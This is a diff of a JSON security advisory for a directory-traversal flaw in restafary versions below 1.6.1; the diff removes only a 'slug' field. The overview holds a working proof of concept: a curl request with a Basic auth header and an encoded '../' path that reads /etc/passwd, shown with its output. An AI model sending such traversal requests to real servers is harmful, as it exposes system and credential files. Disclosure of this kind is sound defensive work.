@@ -9,7 +9,6 @@
   "cves": [],
   "vulnerable_versions": "<1.6.1",
   "patched_versions": ">=1.6.1",
-  "slug": "cloudcmd_directory-traversal",
   "overview": "- restafary is a REpresentful State Transfer API for Creating, Reading, Using, Deleting files on a server from the web\n- restafary is able to set up a root path, which should only allow it to run inside of that root path it specified. \n- An attacker is able to provide a specifically crafted path to access files outside of this specified root path.\n    - Note: this is only possible if the attacker has access to the restafary application.\n\nProof of Concept\n\n```\ncurl -i -s -k  -X 'GET' -H 'Authorization: Basic YWRtaW46cGFzc3dvcmQ=' 'http://localhost:8000/api/v1/fs/..%2f..%2fetc/passwd'\n\n\nHTTP/1.1 200 OK\nX-Powered-By: Express\nAccess-Control-Allow-Origin: *\nContent-Type: text/plain; charset=UTF-8\nVary: Accept-Encoding\nAccept-Ranges: bytes\nLast-Modified: Sun Jul 12 2015 22:38:08 GMT-0700 (PDT)\nContent-Length: 5581\nCache-Control: max-age=0\nDate: Fri, 25 Mar 2016 17:30:29 GMT\nConnection: keep-alive\n\n##\n# User Database\n# \n# Note that this file is consulted directly only when the system is running\n# in single-user mode.  At other times this information is provided by\n# Open Directory.\n#\n# See the opendirectoryd(8) man page for additional information about\n# Open Directory.\n##\nnobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false\nroot:*:0:0:System Administrator:/var/root:/bin/sh\n```",
   "recommendation": "Upgrade to restafary version 1.6.1 or greater.",
   "references": null,
